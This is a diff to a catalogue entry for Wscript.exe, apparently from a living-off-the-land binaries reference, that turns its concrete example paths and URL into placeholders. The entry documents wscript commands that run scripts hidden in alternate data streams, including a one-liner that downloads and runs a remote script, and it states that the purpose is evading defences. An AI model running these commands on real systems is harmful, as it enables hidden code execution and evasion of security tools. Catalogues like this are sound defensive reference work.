@@ -1,10 +1,10 @@
 ---
 Name: Wscript.exe
 Description: Used by Windows to execute scripts
-Author: 'Oddvar Moe'
+Author: Oddvar Moe
 Created: 2018-05-25
 Commands:
-  - Command: wscript //e:vbscript c:\ads\file.txt:script.vbs
+  - Command: wscript //e:vbscript {PATH}:script.vbs
     Description: Execute script stored in an alternate data stream
     Usecase: Execute hidden code to evade defensive counter measures
     Category: ADS
@@ -13,7 +13,7 @@ Commands:
     OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
     Tags:
       - Execute: WSH
-  - Command: echo GetObject("script:https://raw.githubusercontent.com/sailay1996/misc-bin/master/calc.js") > %temp%\test.txt:hi.js && wscript.exe %temp%\test.txt:hi.js
+  - Command: echo GetObject("script:{REMOTEURL:.js}") > {PATH_ABSOLUTE}:hi.js && wscript.exe {PATH_ABSOLUTE}:hi.js
     Description: Download and execute script stored in an alternate data stream
     Usecase: Execute hidden code to evade defensive counter measures
     Category: ADS
